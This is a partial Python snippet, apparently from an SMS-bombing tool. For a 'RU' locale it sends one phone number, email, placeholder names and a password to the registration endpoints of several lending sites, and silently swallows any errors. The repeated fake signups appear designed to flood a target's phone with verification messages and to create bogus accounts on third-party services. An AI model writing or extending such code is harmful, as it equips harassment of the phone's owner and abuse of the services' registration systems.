            ...
            try:
                if locale == "RU":
                    ...
                    try:
                        ...
                        pass
                    try:
                        requests.post("https://ng-api.webbankir.com/user/v2/create", json={"nowName":"иванов", "firstName":"иван", "middleName":"иванович", "mobilePhone":phone, "email":email, "smsCode":""})
                    except:
                        pass
                    try:
                    ...
                    try:
                        phonee=mask(str=phone, maska="+#-###-###-##-##")
                        requests.post("https://paylate.ru/registry", data={"mobile": phonee, "first_name": name, "now_name": name, "nick_name": name, "gender-client": 1, "email": email, "action": "registry"})
                    except:
                        pass
                    try:
                    ...
                    try:
                        phonee=mask(str=phone, maska="+## (###) ###-##-##")
                        requests.post("https://e-groshi.com/online/reg", data={"first_name": name, "now_name": name, "third_name": name, "phone": phonee, "password": password, "password2": password})
                    except:
                        pass
                    try:
